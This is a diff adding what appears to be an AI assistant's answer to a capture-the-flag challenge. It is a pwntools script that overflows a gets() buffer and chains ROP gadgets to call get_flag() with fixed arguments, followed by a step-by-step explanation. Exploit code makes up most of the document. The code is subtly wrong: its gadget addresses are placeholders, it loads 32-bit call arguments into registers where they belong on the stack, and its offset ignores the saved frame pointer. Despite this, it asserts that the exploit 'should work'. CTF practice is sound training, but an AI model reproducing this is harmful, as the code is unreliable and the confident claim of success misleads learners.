@@ -1,0 +1,101 @@
+To solve this challenge using `pwntools`, we need to exploit the buffer overflow vulnerability in the `gets()` function in the `main()` function. The goal is to call the `get_flag()` function with the correct arguments (`a1 = 814536271` and `a2 = 425138641`) using Return-Oriented Programming (ROP).
+
+Here are the steps to solve the challenge:
+
+---
+
+### Steps to Solve the Challenge
+
+1. **Analyze the Binary**:
+   - The `main()` function uses `gets()` to read user input into a buffer of size 56 bytes (`v5[56]`), which is vulnerable to buffer overflow.
+   - The `get_flag()` function is the target function, and it requires two specific arguments (`a1 = 814536271` and `a2 = 425138641`).
+
+2. **Find Gadgets**:
+   - Use the provided ROP gadgets to control the registers and set up the arguments for the `get_flag()` function.
+
+3. **Build the Exploit**:
+   - Overflow the buffer in `main()` to overwrite the return address.
+   - Use ROP to call `get_flag()` with the required arguments.
+
+4. **Write the Exploit Code**:
+   - Use `pwntools` to craft the payload and interact with the binary.
+
+---
+
+### Exploit Code
+
+Here is the Python exploit code using `pwntools`:
+
+```python
+from pwn import *
+
+# Set up the binary
+binary = './rop'
+elf = ELF(binary)
+
+# Start the process or connect to the remote server
+p = process(binary)  # Use `remote('host', port)` for remote challenges
+
+# Addresses
+get_flag_addr = elf.symbols['get_flag']  # Address of get_flag()
+pop_eax_ret = 0x080b91e6  # Example gadget to pop eax (use the correct gadget)
+pop_ebx_esi_edi_ret = 0x0809e102  # Example gadget to pop ebx, esi, edi (use the correct gadget)
+
+# Arguments for get_flag()
+arg1 = 814536271  # First argument
+arg2 = 425138641  # Second argument
+
+# Offset to overwrite the return address
+offset = 56  # Size of the buffer in main()
+
+# Build the ROP chain
+rop_chain = b''
+rop_chain += p32(pop_eax_ret)  # Gadget to pop eax
+rop_chain += p32(arg1)         # First argument (a1)
+rop_chain += p32(pop_ebx_esi_edi_ret)  # Gadget to pop ebx, esi, edi
+rop_chain += p32(arg2)         # Second argument (a2)
+rop_chain += p32(0)            # Padding for esi
+rop_chain += p32(0)            # Padding for edi
+rop_chain += p32(get_flag_addr)  # Call get_flag()
+
+# Build the payload
+payload = b'A' * offset  # Overflow the buffer
+payload += rop_chain     # Add the ROP chain
+
+# Send the payload
+p.sendlineafter('Qual a palavrinha magica? ', payload)
+
+# Interact with the process to get the flag
+p.interactive()
+```
+
+---
+
+### Explanation of the Code
+
+1. **Binary Setup**:
+   - Load the binary using `pwntools`' `ELF` module to extract symbols and addresses.
+
+2. **ROP Chain**:
+   - Use the gadgets provided in the challenge to set up the arguments for the `get_flag()` function.
+   - The `pop eax` gadget is used to set the first argument (`a1`).
+   - The `pop ebx, esi, edi` gadget is used to set the second argument (`a2`) and provide padding for unused registers.
+
+3. **Payload Construction**:
+   - Overflow the buffer with `A` characters to reach the return address.
+   - Append the ROP chain to overwrite the return address and call `get_flag()`.
+
+4. **Interaction**:
+   - Send the payload to the binary and interact with it to retrieve the flag.
+
+---
+
+### Notes
+
+- Replace the gadget addresses with the correct ones from the provided list.
+- If the challenge is remote, replace `process(binary)` with `remote('host', port)`.
+- Ensure that the binary is running in the same environment as the exploit (e.g., 64-bit or 32-bit).
+
+---
+
+This exploit should work for the given challenge. Let me know if you need further clarification!
